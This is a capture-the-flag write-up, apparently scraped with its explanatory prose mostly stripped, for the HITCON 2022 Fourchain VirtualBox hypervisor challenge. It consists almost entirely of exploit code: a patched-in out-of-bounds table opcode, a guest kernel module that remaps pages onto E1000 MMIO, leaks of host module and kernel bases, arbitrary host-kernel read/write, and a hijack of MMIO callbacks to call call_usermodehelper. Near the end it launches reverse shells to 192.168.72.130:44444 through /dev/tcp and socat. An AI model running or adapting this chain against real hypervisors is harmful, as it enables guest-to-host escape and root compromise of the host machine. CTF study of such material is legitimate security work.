# HITCON CTF 2022 — Fourchain – Hypervisor

> 原文: https://www.ctfiot.com/81562.html
> ID: 81562


```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
diff -Naur VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h Chall/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h
--- VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h	2022-10-11 21:51:54.000000000 +0800
+++ Chall/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h	2022-11-02 19:18:19.196674293 +0800
@@ -20,7 +20,7 @@
 * Global Variables *
 *******************************************************************************/
 extern const PFNIEMOP g_apfnOneByteMap[256]; /* not static since we need to forward declare it. */
-
+static uint64_t Table[0x10];
 #ifdef _MSC_VER
 # pragma warning(push)
 # pragma warning(disable: 4702) /* Unreachable code like return in iemOp_Grp6_lldt. */
@@ -538,6 +538,40 @@
 return IEMOP_RAISE_INVALID_OPCODE();
 }

+FNIEMOP_DEF(iemOp_ReadTable)
+{
+ if (pVCpu->iem.s.enmCpuMode == IEMMODE_64BIT && pVCpu->iem.s.uCpl == 0 )
+	{
+ IEM_MC_BEGIN(0, 2);
+ IEM_MC_LOCAL(uint64_t, u64Idx);
+ IEM_MC_FETCH_GREG_U64(u64Idx, X86_GREG_xBX);
+ IEM_MC_LOCAL_CONST(uint64_t, u64Value,/*=*/ Table[u64Idx]);
+ IEM_MC_STORE_GREG_U64(X86_GREG_xAX, u64Value);
+ IEM_MC_ADVANCE_RIP();
+ IEM_MC_END();
+ return VINF_SUCCESS;
+	}
+	return IEMOP_RAISE_INVALID_OPCODE();
+}
+
+
+FNIEMOP_DEF(iemOp_WriteTable)
+{
+ if (pVCpu->iem.s.enmCpuMode == IEMMODE_64BIT && pVCpu->iem.s.uCpl == 0 )
+	{
+ IEM_MC_BEGIN(0, 2);
+ IEM_MC_LOCAL(uint64_t, u64Idx);
+ IEM_MC_FETCH_GREG_U64(u64Idx, X86_GREG_xBX);
+ IEM_MC_LOCAL(uint64_t, u64Value);
+ IEM_MC_FETCH_GREG_U64(u64Value, X86_GREG_xAX);
+ Table[u64Idx] = u64Value;
+ IEM_MC_ADVANCE_RIP();
+ IEM_MC_END();
+ return VINF_SUCCESS;
+	}
+	return IEMOP_RAISE_INVALID_OPCODE();
+}
+

 /** Invalid with RM byte . */
 FNIEMOPRM_DEF(iemOp_InvalidWithRM)
diff -Naur VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructionsTwoByte0f.cpp.h Chall/src/VBox/VMM/VMMAll/IEMAllInstructionsTwoByte0f.cpp.h
--- VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructionsTwoByte0f.cpp.h	2022-10-11 21:51:55.000000000 +0800
+++ Chall/src/VBox/VMM/VMMAll/IEMAllInstructionsTwoByte0f.cpp.h	2022-11-02 16:18:35.752320732 +0800
@@ -9539,9 +9539,9 @@
 /* 0x22 */ iemOp_mov_Cd_Rd, iemOp_mov_Cd_Rd, iemOp_mov_Cd_Rd, iemOp_mov_Cd_Rd,
 /* 0x23 */ iemOp_mov_Dd_Rd, iemOp_mov_Dd_Rd, iemOp_mov_Dd_Rd, iemOp_mov_Dd_Rd,
 /* 0x24 */ iemOp_mov_Rd_Td, iemOp_mov_Rd_Td, iemOp_mov_Rd_Td, iemOp_mov_Rd_Td,
- /* 0x25 */ iemOp_Invalid, iemOp_Invalid, iemOp_Invalid, iemOp_Invalid,
+ /* 0x25 */ iemOp_ReadTable, iemOp_Invalid, iemOp_Invalid, iemOp_Invalid,
 /* 0x26 */ iemOp_mov_Td_Rd, iemOp_mov_Td_Rd, iemOp_mov_Td_Rd, iemOp_mov_Td_Rd,
- /* 0x27 */ iemOp_Invalid, iemOp_Invalid, iemOp_Invalid, iemOp_Invalid,
+ /* 0x27 */ iemOp_WriteTable, iemOp_Invalid, iemOp_Invalid, iemOp_Invalid,
 /* 0x28 */ iemOp_movaps_Vps_Wps, iemOp_movapd_Vpd_Wpd, iemOp_InvalidNeedRM, iemOp_InvalidNeedRM,
 /* 0x29 */ iemOp_movaps_Wps_Vps, iemOp_movapd_Wpd_Vpd, iemOp_InvalidNeedRM, iemOp_InvalidNeedRM,
 /* 0x2a */ iemOp_cvtpi2ps_Vps_Qpi, iemOp_cvtpi2pd_Vpd_Qpi, iemOp_cvtsi2ss_Vss_Ey, iemOp_cvtsi2sd_Vsd_Ey,
hmR0VmxExitEptMisconfig
 -> PGMR0Trap0eHandlerNPMisconfig
 -> iomMmioPfHandlerNew
 -> iomMmioCommonPfHandlerNew
 -> IEMExecOne ( Reach IEM )
cat /proc/iomem
...............
...............
 fd5c0000-fd5dffff : e1000 <----- HERE
 fd5ef000-fd5effff : 0000:02:03.0
 fd5ef000-fd5effff : ehci_hcd
 fdff0000-fdffffff : 0000:02:01.0
 fdff0000-fdffffff : e1000
 fe000000-fe7fffff : 0000:00:0f.0
 fe000000-fe7fffff : vmwgfx probe
...............
...............
1
2
3
4
    #define E1000_MMIO_BASE 0xfd5c0000

int* addr = ioremap(E1000_MMIO_BASE,0x1000);
addr[0] = 0x41414141; // write to MMIO
1
2
3
4
5
6
7
8
9
    #define E1000_CTRL 0x00000	/* Device Control - RW */
    #define E1000_CTRL_DUP 0x00004	/* Device Control Duplicate (Shadow) - RW */
    #define E1000_STATUS 0x00008	/* Device Status - RO */
    #define E1000_EECD 0x00010	/* EEPROM/Flash Control - RW */
    #define E1000_EERD 0x00014	/* EEPROM Read - RW */
    #define E1000_CTRL_EXT 0x00018	/* Extended Device Control - RW */
    #define E1000_FLA 0x0001C	/* Flash Access - RW */
    #define E1000_MDIC 0x00020	/* MDI Control - RW */
....................
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
/**
 * Register map table.
 *
 * Override pfnRead and pfnWrite to get register-specific behavior.
 */
static const struct E1kRegMap_st
{
 /** Register offset in the register space. */
 uint32_t offset;
 /** Size in bytes. Registers of size > 4 are in fact tables. */
 uint32_t size;
 /** Readable bits. */
 uint32_t readable;
 /** Writable bits. */
 uint32_t writable;
 /** Read callback. */
 FNE1KREGREAD *pfnRead;
 /** Write callback. */
 FNE1KREGWRITE *pfnWrite;
 /** Abbreviated name. */
 const char *abbrev;
 /** Full name. */
 const char *name;
} g_aE1kRegMap[E1K_NUM_OF_REGS] =
{
 /* offset size read mask write mask read callback write callback abbrev full name */
 /*------- ------- ---------- ---------- ----------------------- ------------------------ ---------- ------------------------------*/
 { 0x00000, 0x00004, 0xDBF31BE9, 0xDBF31BE9, e1kRegReadDefault , e1kRegWriteCTRL , "CTRL" , "Device Control" },
 { 0x00008, 0x00004, 0x0000FDFF, 0x00000000, e1kRegReadDefault , e1kRegWriteUnimplemented, "STATUS" , "Device Status" },
 { 0x00010, 0x00004, 0x000027F0, 0x00000070, e1kRegReadEECD , e1kRegWriteEECD , "EECD" , "EEPROM/Flash Control/Data" },
 { 0x00014, 0x00004, 0xFFFFFF10, 0xFFFFFF00, e1kRegReadDefault , e1kRegWriteEERD , "EERD" , "EEPROM Read" },
 { 0x00018, 0x00004, 0xFFFFFFFF, 0xFFFFFFFF, e1kRegReadUnimplemented, e1kRegWriteUnimplemented, "CTRL_EXT", "Extended Device Control" },
 { 0x0001c, 0x00004, 0xFFFFFFFF, 0xFFFFFFFF, e1kRegReadUnimplemented, e1kRegWriteUnimplemented, "FLA" , "Flash Access (N/A)" },
 { 0x00020, 0x00004, 0xFFFFFFFF, 0xFFFFFFFF, e1kRegReadDefault , e1kRegWriteMDIC , "MDIC" , "MDI Control" },
 .............................................................
/* offset size read mask write mask read callback write callback abbrev full name */
/*------- ------- ---------- ---------- ----------------------- ------------------------ ---------- ------------------------------*/
{ 0x05820, 0x00004, 0xFFFFFFFF, 0xFFFFFFFF, e1kRegReadDefault , e1kRegWriteDefault , "MANC" , "Management Control" },
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
static int drv_open(struct inode *inode, struct file *filp);
static ssize_t drv_read(struct file *file, char __user *buf,size_t count, loff_t *ppos);

static struct file_operations drv_fops = {
 open : drv_open,
 read : drv_read
};

static int drv_open(struct inode *inode, struct file *filp) {
 printk(KERN_INFO "In drv_open\n");
 return 0;
}

static struct miscdevice pwn_miscdev = {
 .minor = 100,
 .name = "pwn",
 .fops = &drv_fops,
};

static ssize_t drv_read(struct file *file, char __user *buf,
 size_t count, loff_t *ppos) {

 /* We put our exploit here */
 printk(KERN_INFO "In drv_read\n");
 return 0;
}

int init_module(void) {
 return misc_register(&pwn_miscdev);

}

void cleanup_module(void) {
	misc_deregister(&pwn_miscdev);
}

MODULE_LICENSE("GPL");
1
2
3
4
5
6
7
8
9
    #include 
    #include <stdlib.h>

char buf[0x100];
int main(){
 system("insmod test.ko");
 int fd = open("/dev/pwn",2);
 read(fd,buf,1); // trigger drv_read
}
obj-m += test.o
CFLAGS_test.o := -masm=intel -w
PWD := $(CURDIR)

all:
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 gcc exp.c -w --static -o exp

clean:
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
    #define E1000_MMIO_BASE 0xf0000000
    #define RT 0x0000250f // iemOp_ReadTable
    #define WT 0x0000270f // iemOp_WriteTable

static ssize_t drv_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) {

 /* We put our exploit here */

 printk(KERN_INFO "In drv_read\n");

 /* E1000_MANC: E1000_MMIO_BASE + 0x5820 */
 int* inst = ioremap(E1000_MMIO_BASE + 0x5000, 0x1000);
 inst[0x820/4] = RT; // iemOp_ReadTable

 return 0;
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
static size_t *to_page_entry(size_t cr3, size_t addr) {
 /* Get the PTE of addr */

 size_t idx, i;
 size_t val = cr3;
 for (i = 0; i < 4; i++) {
 val &= (0xfffffffff000UL); // physical address
 val += PAGE_OFFSET; // alias page
 idx = addr >> (12 + (3 - i) * 9);
 idx &= ((1 << 9) - 1);
 if (i < 3)
 val = *((size_t *)(val + idx * 8));
 else
 return ((size_t *)(val + idx * 8));
 }
 return 0;
}

static ssize_t drv_read(struct file *file, char __user *buf,
 size_t count, loff_t *ppos) {
 // .......omitted....................

 char *code = kmalloc(0x1000, GFP_KERNEL); // [1]
 size_t cr3;

 asm(
 "mov %[val],cr3\r\n;"
 : [val] "=r"(cr3)::
 );

 size_t *ent = to_page_entry(cr3, (size_t)code); // [2]
 size_t *B = to_page_entry(cr3, (size_t)drv_read); // [3]
 *ent = (E1000_MMIO_BASE + 0x5000) | ((*B) & 0xff00000000000fffULL); // [4]

 // .......omitted....................
}
1
2
3
4
5
asm volatile(
 "mov rbx,0x41414141\r\n;" // the Table index
 "mov rcx,%[code]\r\n;" // code+0x820, which will ended up in E1000_MMIO_BASE + 0x5000 + 0x820 == E1000_MANC
 "call rcx\r\n;" ::[code] "r"(code + 0x820) : "rax", "rbx", "rcx"
);
1
inst[0x820/4] = WT;
1
2
3
4
5
6
asm volatile(
 "mov rbx,0x100\r\n;" // index
 "mov rax, 0x4141414141414141\r\n;" // write 0x4141414141414141
 "mov rcx,%[code]\r\n;"
 "call rcx\r\n;" ::[code] "r"(code + 0x820) : "rax", "rbx", "rcx"
);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
    #define E1000_MMIO_BASE 0xf0000000
    #define RT 0x00c3250f
    #define WT 0x00c3270f

    #define sll signed long long

static size_t __attribute__((optimize("O0"))) read_table(int *inst, char *code, sll idx) {

 /* iemOp_ReadTable */

 inst[0x820/4] = RT;
 size_t ret;
 asm volatile(
 "mov rbx,%[idx]\r\n;"
 "mov rcx,%[code]\r\n;"
 "call rcx\r\n;"
 "mov %[ret], rax\r\n;"
 :[ret]"=r"(ret)
 :[idx]"r"(idx),[code]"r"(code+0x820)
 :"rax","rbx","rcx"
 );
 return ret;
}

static void __attribute__((optimize("O0"))) write_table(int *inst, char *code, sll idx, size_t val) {

 /* iemOp_WriteTable */

 inst[0x820/4] = WT;
 asm volatile(
 "mov rbx,%[idx]\r\n;"
 "mov rax,%[val]\r\n;"
 "mov rcx,%[code]\r\n;"
 "call rcx\r\n;"
 :
 :[idx]"r"(idx),[val]"r"(val),[code]"r"(code+0x820)
 :"rax","rbx","rcx"
 );
}

static ssize_t drv_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) {

 printk(KERN_INFO "In drv_read\n");

 /* E1000_MANC: E1000_MMIO_BASE + 0x5820 */
 int* inst = ioremap(E1000_MMIO_BASE+0x5000,0x1000);

 char* code = kmalloc(0x1000,GFP_KERNEL);
 size_t cr3;
 asm(
 "mov %[val],cr3\r\n;"
 :[val]"=r"(cr3)::
 );

 /* Modify code's PTE so code points to E1000_MMIO_BASE+0x5000 */
 size_t* ent = to_page_entry(cr3,(size_t)code);
 size_t* B = to_page_entry(cr3,(size_t)drv_read);
 *ent = (E1000_MMIO_BASE+0x5000) | ( (*B)&0xff00000000000fffULL);
 // Do read/write table
 sll idx = <some index>;
 size_t val = <some value>;
 write_table(inst, code, idx, val);
 read_table(inst, code, idx);

 return 0;
}
1
2
3
4
5
// leak VMMR0.r0's base
sll off_table = 0x1FC060; // table's offset in VMMR0.r0
sll off_iemAImpl_mul_u8 = 0x1dacd0; // iemAImpl_mul_u8's got in VMMR0.r0
size_t vmmr0_base = read_table(inst, code, (off_iemAImpl_mul_u8 - off_table)>>3 ) - 0x11a6a8;
printk(KERN_INFO "vmmr0_base: %px\n", vmmr0_base);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
sll table;

static size_t __attribute__((optimize("O0"))) arb_read(int *inst, char *code, sll addr) {

 /* arbitrary read */

 return read_table( inst, code, (addr - table)>>3 );
}

static void __attribute__((optimize("O0"))) arb_write(int *inst, char *code, sll addr, size_t val) {

 /* arbitrary write */

 return write_table( inst, code, (addr - table)>>3, val );
}

table = vmmr0_base + off_table;
// Do kernel arbitrary read/write
addr = <some kernel address>;
arb_read(inst, code, addr);
arb_write(inst, code, addr, val);
1
2
3
size_t got_SUPR0EnableVTx = vmmr0_base + 0x1DB018; // SUPR0EnableVTx@got.plt
size_t vboxdrv_base = arb_read(inst, code, (sll)got_SUPR0EnableVTx) - 0x8a0;
printk(KERN_INFO "vboxdrv_base: %px\n", vboxdrv_base);
1
2
3
4
5
6
7
8
9
// read the 4 byte offset
size_t tmp = arb_read(inst, code, (sll)(vboxdrv_base+0x15a8a+1));
tmp = (tmp >> 24)&0xffffffff; // tmp = 4 byte offset
printk(KERN_INFO "tmp: %px\n", tmp);
signed int kfree_offset = (signed int)(tmp);
printk(KERN_INFO "kfree_offset: %d\n", kfree_offset);
// calculate kernel base
size_t kernel_base = vboxdrv_base + 0x15a8a + 5 + kfree_offset - 0x2a2af0;
printk(KERN_INFO "kernel_base: %px\n", kernel_base);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
static void __attribute__((optimize("O0"))) write_string(int *inst, char *code, sll addr, char* string) {
 int i = 0, cnt = 0, written = 0;
 size_t val = 0;
 int sz = strlen(string);
 for (i = 0 ; i < sz+1 ; i++) { // to strlen(data)+1 so null byte will be written as well
 val = val | (((size_t)string[i] & 0xff) << ( (i & 7) * 8 ));
 if( (i & 7) == 7 ) {
 arb_write(inst, code, (sll)(addr + (cnt*8)), val);
 cnt++;
 val = 0;
 written = 1;
 } else {
 written = 0;
 }
 }
 if(written == 0) { // need to write one last time
 arb_write(inst, code, (sll)(addr + (cnt*8)), val);
 }
}
1
2
size_t core_pattern = kernel_base + 0x17770c0;
write_string(inst, code, (sll)core_pattern, "|/usr/bin/touch /tmp/123");
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
// vboxhost/vboxdrv/SUPDrvGip.c
/**
 * Maps the GIP into userspace and/or get the physical address of the GIP.
 *
 * @returns IPRT status code.
 * @param pSession Session to which the GIP mapping should belong.
 * @param ppGipR3 Where to store the address of the ring-3 mapping. (optional)
 * @param pHCPhysGip Where to store the physical address. (optional)
 *
 * @remark There is no reference counting on the mapping, so one call to this function
 * count globally as one reference. One call to SUPR0GipUnmap() is will unmap GIP
 * and remove the session as a GIP user.
 */
SUPR0DECL(int) SUPR0GipMap(PSUPDRVSESSION pSession, PRTR3PTR ppGipR3, PRTHCPHYS pHCPhysGip) {
 // ...............omitted............................
 rc = RTR0MemObjMapUser(&pSession->GipMapObjR3, pDevExt->GipMemObj, (RTR3PTR)-1, 0, RTMEM_PROT_READ, NIL_RTR0PROCESS);
 // ...............omitted............................
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
// src/VBox/VMM/VMMR0/IOMR0Mmio.cpp
/**
 * Grows the MMIO registration (all contexts) and lookup tables.
 *
 * @returns VBox status code.
 * @param pGVM The global (ring-0) VM structure.
 * @param cReqMinEntries The minimum growth (absolute).
 * @thread EMT(0)
 * @note Only callable at VM creation time.
 */
VMMR0_INT_DECL(int) IOMR0MmioGrowRegistrationTables(PGVM pGVM, uint64_t cReqMinEntries)
{

 // ...............omitted.....................
 /*
 * Allocate the new tables. We use a single allocation for the three tables (ring-0,
 * ring-3, lookup) and does a partial mapping of the result to ring-3.
 */
 uint32_t const cbRing0 = RT_ALIGN_32(cNewEntries * sizeof(IOMMMIOENTRYR0), PAGE_SIZE);
 uint32_t const cbRing3 = RT_ALIGN_32(cNewEntries * sizeof(IOMMMIOENTRYR3), PAGE_SIZE);
 uint32_t const cbShared = RT_ALIGN_32(cNewEntries * sizeof(IOMMMIOLOOKUPENTRY), PAGE_SIZE);
 uint32_t const cbNew = cbRing0 + cbRing3 + cbShared;

 /* Use the rounded up space as best we can. */
 cNewEntries = RT_MIN(RT_MIN(cbRing0 / sizeof(IOMMMIOENTRYR0), cbRing3 / sizeof(IOMMMIOENTRYR3)),
 cbShared / sizeof(IOMMMIOLOOKUPENTRY));

 RTR0MEMOBJ hMemObj;
 int rc = RTR0MemObjAllocPage(&hMemObj, cbNew, false /*fExecutable*/);
 if (RT_SUCCESS(rc))
 {
 /*
 * Zero and map it.
 */
 RT_BZERO(RTR0MemObjAddress(hMemObj), cbNew);

 RTR0MEMOBJ hMapObj;
 // [1]
 rc = RTR0MemObjMapUserEx(&hMapObj, hMemObj, (RTR3PTR)-1, PAGE_SIZE, RTMEM_PROT_READ | RTMEM_PROT_WRITE,
 RTR0ProcHandleSelf(), cbRing0, cbNew - cbRing0);
 if (RT_SUCCESS(rc))
 {
 PIOMMMIOENTRYR0 const paRing0 = (PIOMMMIOENTRYR0)RTR0MemObjAddress(hMemObj);
 PIOMMMIOENTRYR3 const paRing3 = (PIOMMMIOENTRYR3)((uintptr_t)paRing0 + cbRing0);
 PIOMMMIOLOOKUPENTRY const paLookup = (PIOMMMIOLOOKUPENTRY)((uintptr_t)paRing3 + cbRing3);
 RTR3UINTPTR const uAddrRing3 = RTR0MemObjAddressR3(hMapObj);

// ...............omitted.....................

 /*
 * Update the variables.
 */
 pGVM->iomr0.s.paMmioRegs = paRing0;
 pGVM->iomr0.s.paMmioRing3Regs = paRing3; //[2]
 pGVM->iomr0.s.paMmioLookup = paLookup;
 pGVM->iom.s.paMmioRegs = uAddrRing3; //[3]
 pGVM->iom.s.paMmioLookup = uAddrRing3 + cbRing3;
 pGVM->iom.s.cMmioAlloc = cNewEntries;
 pGVM->iomr0.s.cMmioAlloc = cNewEntries;

// ...............omitted.....................

 return rc;
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
// src/VBox/VMM/VMMR0/GVMMR0.cpp

static PGVMM g_pGVMM = NULL;

/**
 * The GVMM instance data.
 */
typedef struct GVMM
{
 //...............omitted.........................
 /** The handle array.
 * The size of this array defines the maximum number of currently running VMs.
 * The first entry is unused as it represents the NIL handle. */
 GVMHANDLE aHandles[GVMM_MAX_HANDLES];
 //...............omitted.........................
} GVMM;
/** Pointer to the GVMM instance data. */
typedef GVMM *PGVMM;

/**
 * Global VM handle.
 */
typedef struct GVMHANDLE
{
 //...............omitted.........................
 /** The pointer to the ring-0 only (aka global) VM structure. */
 PGVM pGVM;
 //...............omitted.........................
} GVMHANDLE;
1
2
3
4
5
6
7
8
9
10
11
size_t g_pGVMM = arb_read(inst, code, (sll)(vmmr0_base + 0x1E9E68));
printk(KERN_INFO "g_pGVMM: %px\n", g_pGVMM);

size_t pGVM = arb_read(inst, code, (sll)(g_pGVMM + 0xb8 + 0x8)); // g_pGVMM->aHandles[1]->pGVM
printk(KERN_INFO "pGVM: %px\n", pGVM);

// leak pGVM->iom.s.paMmioRegs (r3Map) & pGVM->iomr0.s.paMmioRing3Regs (r0Map)
size_t r0Map = arb_read(inst, code, (sll)(pGVM + 65352)); // paRing3
size_t r3Map = arb_read(inst, code, (sll)(pGVM + 44152)); // uAddrRing3
printk(KERN_INFO "r0Map: %px\n", r0Map);
printk(KERN_INFO "r3Map: %px\n", r3Map);
1
PIOMMMIOENTRYR3 const paRing3
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
// src/VBox/VMM/include/IOMInternal.h

/**
 * Ring-3 MMIO handle table entry.
 */
typedef struct IOMMMIOENTRYR3
{
 /** The number of bytes covered by this entry. */
 RTGCPHYS cbRegion;
 /** The current mapping address (duplicates lookup table).
 * This is set to NIL_RTGCPHYS if not mapped (exclusive lock + atomic). */
 RTGCPHYS volatile GCPhysMapping;
 /** Pointer to user argument. */
 RTR3PTR pvUser;
 /** Pointer to the associated device instance. */
 R3PTRTYPE(PPDMDEVINS) pDevIns;
 /** Pointer to the write callback function. */
 R3PTRTYPE(PFNIOMMMIONEWWRITE) pfnWriteCallback;
 /** Pointer to the read callback function. */
 R3PTRTYPE(PFNIOMMMIONEWREAD) pfnReadCallback;
 /** Pointer to the fill callback function. */
 R3PTRTYPE(PFNIOMMMIONEWFILL) pfnFillCallback;
 /** Description / Name. For easing debugging. */
 R3PTRTYPE(const char *) pszDesc;
 /** PCI device the registration is associated with. */
 R3PTRTYPE(PPDMPCIDEV) pPciDev;

 //...............omitted.........................
} IOMMMIOENTRYR3;
/** Pointer to a ring-3 MMIO handle table entry. */
typedef IOMMMIOENTRYR3 *PIOMMMIOENTRYR3;
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
/*
 * According to debugger, there are 5 entries in the table
 * Each entry represent a device
 * APIC, I/O APIC, VGA, E1000, AHCI
 * Overwrite them all
 * */

for (i = 0 ; i < 5 ; i++) {
 size_t devin_off = (88 * i) + 0x18; // pDevIns
 size_t write_cb_off = (88 * i) + 0x20; // pfnWriteCallback
 size_t read_cb_off = (88 * i) + 0x28; // pfnReadCallback
 arb_write(inst, code, (sll)(r0Map + devin_off), 0x1234);
 arb_write(inst, code, (sll)(r0Map + write_cb_off), 0x1234);
 arb_write(inst, code, (sll)(r0Map + read_cb_off), 0x1234);
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
// src/VBox/Devices/Network/DevE1000.cpp

/**
 * Write handler for EEPROM/Flash Control/Data register.
 *
 * Handles EEPROM access requests; forwards writes to EEPROM device if access has been granted.
 *
 * @param pThis The device state structure.
 * @param offset Register offset in memory-mapped frame.
 * @param index Register index in register array.
 * @param value The value to store.
 * @param mask Used to implement partial writes (8 and 16-bit).
 * @thread EMT
 */
static int e1kRegWriteEECD(PPDMDEVINS pDevIns, PE1KSTATE pThis, uint32_t offset, uint32_t index, uint32_t value)
{
 RT_NOREF(pDevIns, offset, index);
    #ifdef IN_RING3
 //...............omitted.........................
 return VINF_SUCCESS;
    #else /* !IN_RING3 */
 RT_NOREF(pThis, value);
 return VINF_IOM_R3_MMIO_WRITE; // <-- HERE
    #endif /* !IN_RING3 */
}
1
2
3
4
// trigger crash
// this is a R3 MMIO write ( return VINF_IOM_R3_MMIO_WRITE; in e1kRegReadEECD )
int* inst2 = ioremap(E1000_MMIO_BASE,0x1000);
inst2[0x10/4] = 0; // E1000_EECD = E1000_MMIO_BASE + 0x10
|/usr/bin/socat exec:'bash',pty,stderr,setsid,sigint,sane tcp:
192.168.72.130:
44444
1
2
PIOMMMIOENTRYR0 const paRing0 = (PIOMMMIOENTRYR0)RTR0MemObjAddress(hMemObj);
PIOMMMIOENTRYR3 const paRing3 = (PIOMMMIOENTRYR3)((uintptr_t)paRing0 + cbRing0);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
// src/VBox/VMM/include/IOMInternal.h

/**
 * Ring-0 MMIO handle table entry.
 */
typedef struct IOMMMIOENTRYR0
{
 /** The number of bytes covered by this entry, 0 if entry not used. */
 RTGCPHYS cbRegion;
 /** Pointer to user argument. */
 RTR0PTR pvUser;
 /** Pointer to the associated device instance, NULL if entry not used. */
 R0PTRTYPE(PPDMDEVINS) pDevIns;
 /** Pointer to the write callback function. */
 R0PTRTYPE(PFNIOMMMIONEWWRITE) pfnWriteCallback;
 /** Pointer to the read callback function. */
 R0PTRTYPE(PFNIOMMMIONEWREAD) pfnReadCallback;
 /** Pointer to the fill callback function. */
 R0PTRTYPE(PFNIOMMMIONEWFILL) pfnFillCallback;
 /** The entry of the first statistics entry, UINT16_MAX if no stats.
 * @note For simplicity, this is always copied from ring-3 for all entries at
 * the end of VM creation. */
 uint16_t idxStats;
 /** Same as the handle index. */
 uint16_t idxSelf;
 /** IOM_MMIO_F_XXX (copied from ring-3). */
 uint32_t fFlags;
} IOMMMIOENTRYR0;
/** Pointer to a ring-0 MMIO handle table entry. */
typedef IOMMMIOENTRYR0 *PIOMMMIOENTRYR0;
1
2
3
// src/VBox/VMM/VMMAll/IOMAllMmioNew.cpp
// In function iomMmioDoWrite()
pfnWriteCallback(pDevIns, pvUser, !(fFlags & IOMMMIO_FLAGS_ABS) ? offRegion : GCPhys, ......);
1
2
3
    #define IOAPIC_BASE 0xfec00000
uint8_t* inst2 = ioremap(IOAPIC_BASE, 0x1000);
inst2[0] = 0; // ring-0 MMIO write
1
2
3
4
5
6
7
8
// src/VBox/VMM/VMMAll/IOMAllMmioNew.cpp
// In function iomMmioHandlerNew

VBOXSTRICTRC rcStrict = PDMCritSectEnter(pDevIns->CTX_SUFF(pCritSectRo), rcToRing3);
if (rcStrict == VINF_SUCCESS)
{
 // .....omitted..................
 iomMmioDoWrite(pVM, pVCpu, pRegEntry, GCPhysFault, .....);
1
int call_usermodehelper(const char *path, char **argv, char **envp, int wait);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
// leak pGVM->iomr0.s.paMmioRegs (paRing0)
size_t paRing0 = arb_read(inst, code, (sll)(pGVM + 65336)); // g_pGVMM->aHandles[1]->pGVM->iomr0.s.paMmioRegs
printk(KERN_INFO "paRing0: %px\n", paRing0);

/* paRing0: Ring0 MMIO registration table, including entries for APIC, IO APIC, VGA, AHCI, E1000
 * We modify the entry of IO APIC
 */
size_t pDevIns = arb_read(inst, code, (sll)(paRing0 + 0x38 + 0x10)); // DeviceIOAPIC->pDevIns
printk(KERN_INFO "pDevIns: %px\n", pDevIns);
// Construct argv
size_t argv_buf = paRing0 + 0x120;
size_t c_buf = paRing0 + 0x160;
size_t sh_buf = paRing0 + 0x190;
// write command string
write_string(inst, code, (sll)pDevIns, "/bin/bash"); // pDevIns = "/bin/bash"
write_string(inst, code, (sll)c_buf, "-c");
write_string(inst, code, (sll)sh_buf, "sh</dev/tcp/192.168.72.130/44444");
// write argv pointers
arb_write(inst, code, (sll)(argv_buf), pDevIns); // argv[0] = pDevIns = "/bin/bash"
arb_write(inst, code, (sll)(argv_buf + 0x8), c_buf); // argv[1] = "-c";
arb_write(inst, code, (sll)(argv_buf + 0x10), sh_buf); // argv[2] = "sh</dev/tcp/192.168.72.130/44444";
arb_write(inst, code, (sll)(argv_buf + 0x18), 0); // argv[3] = NULL;
// overwrite DeviceIOAPIC
arb_write(inst, code, (sll)(paRing0 + 0x38 + 0x8), argv_buf); // DeviceIOAPIC->pvUser = argv buf
arb_write(inst, code, (sll)(paRing0 + 0x38 + 0x18), call_usermodehelper); // DeviceIOAPIC->pfnWriteCallback = call_usermodehelper

// trigger ioapicMmioWrite
// this will call DeviceIOAPIC->pfnWriteCallback(DeviceIOAPIC->pDevIns, DeviceIOAPIC->pvUser, 0, <some pointer>, .....);
// which will now be call_usermodehelper("/bin/bash", argv, 0, <some pointer>). <some pointer> will not affect call_usermodehelper
uint8_t* inst2 = ioremap(IOAPIC_BASE, 0x1000);
inst2[0] = 0;
1
_copy_from_user(/*<kernel address for dst>*/, /**/, size);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
// Get the address of IO APIC's pDevIns
